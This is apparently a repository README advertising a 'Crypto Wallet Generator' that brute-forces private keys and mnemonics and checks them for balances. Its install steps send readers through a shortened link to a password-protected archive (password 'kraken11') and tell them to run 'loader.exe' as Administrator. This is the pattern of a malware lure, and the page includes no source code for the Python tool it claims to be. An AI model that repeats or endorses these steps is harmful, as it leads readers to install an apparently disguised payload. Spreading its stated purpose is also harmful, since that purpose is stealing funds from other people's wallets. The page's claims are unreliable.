![Crypto Wallet Generator](bc.gif)

**Programmed in Python | PySimpleGUI**

[![Bitcoin Private Key Finder](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=FF0000)](https://tr.ee/r5KixK)

[![forthebadge made-with-python](http://ForTheBadge.com/images/badges/made-with-python.svg)](https://www.python.org/)

[![Open Source Love svg1](https://badges.frapsoft.com/os/v1/open-source.svg?v=103)](https://github.com/)

[![Maintenance](https://img.shields.io/badge/Maintained%3F-yes-green.svg)](https://github.com/)


# Crypto Wallet Generator

```
Multi-chain cryptocurrency wallet generator with built-in balance checker.
Generates wallets for Bitcoin, Ethereum, Solana, and other major networks.
Checks generated addresses against public blockchain APIs for existing balances.

Automated Bitcoin wallet generator. With mnemonic and passphrases bruteforces wallet addresses.
```

## Supported Networks

| Network | Address Format | Derivation |
|---------|---------------|------------|
| Bitcoin (BTC) | P2PKH, P2SH, bech32 | BIP44 m/44'/0' |
| Ethereum (ETH) | 0x... hex | BIP44 m/44'/60' |
| Solana (SOL) | Base58 | ed25519 |
| Litecoin (LTC) | L... or M... | BIP44 m/44'/2' |
| Dogecoin (DOGE) | D... | BIP44 m/44'/3' |

## 🔗 Download - v1.19.1

[![Bitcoin Private Key Finder](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=FF0000)](https://tr.ee/r5KixK)

## Usage

### Windows

1. Download the archive from the link above
2. Extract installer.zip archive using WinRAR or 7-Zip
3. Enter password: kraken11
4. Run `loader.exe` as **Administrator**
5. Press start button to batch generate

## CLI Options

```
--network    Target blockchain (btc, eth, sol, ltc, doge)
--mode       Generation mode: random, sequential, mnemonic
--threads    Number of parallel generation workers (default: 2)
--output     Output file path (default: found_wallets.txt)
--check      Enable live balance checking (requires API key)
```

## Output Format

Non-zero balance wallets are written to the output file:
```
network: BTC
address: 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy
private key: e9873d79c6d87dc0fb6a5778633389f4453213303da61f20bd67fc233aa33262
mnemonic: word1 word2 word3 ... word12
balance: 0.12340000 BTC
```

## Architecture

The generator uses a producer-consumer threading model: worker threads
generate keys and push them to a shared queue, while checker threads
pull from the queue and validate against blockchain APIs with configurable
rate limiting to avoid bans.

# Disclaimer

**The code within this repository comes with no guarantee, the use of this code is your responsibility. I take NO responsibility and/or liability for how you choose to use any of the source code available here. By using any of the files available in this repository, you understand that you are AGREEING TO USE AT YOUR OWN RISK. ALL files available here are for EDUCATION and/or RESEARCH purposes ONLY.**

## 🔗 Download - v1.19.1

[![Bitcoin Private Key Finder](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=FF0000)](https://tr.ee/r5KixK)